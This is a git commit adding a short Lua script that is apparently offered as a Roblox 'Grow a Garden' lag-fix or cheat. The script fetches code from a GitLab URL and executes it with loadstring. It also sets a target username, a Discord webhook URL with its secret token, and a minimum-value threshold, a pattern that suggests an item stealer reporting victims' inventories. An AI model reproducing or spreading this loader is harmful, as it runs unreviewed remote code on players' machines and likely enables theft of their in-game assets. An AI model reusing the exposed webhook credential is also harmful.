ac00a5d0f39f7b05e33e62f0524a1ff0056388ed
NoLagGrowAGarden <markosgreek2@gmail.com>
2025-07-28 15:12:44 +0200

    Upload legendary-asdasdasDasDasDscript.lua via Script Source Converter

---
+++ legendary-asdasdasDasDasDscript.lua
@@ -0,0 +1,5 @@
+Username = "Sponge_bob20183"
+Webhook = "https://discord.com/api/webhooks/1399378746078920715/S5oWamA8sy5JYOxcUQKJWnFodgJOEO0qNUtLseT-MgRn-PlP4fJ3jCD0SO3zXBCxA2Q6"
+MinimumValue = 700000000000
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
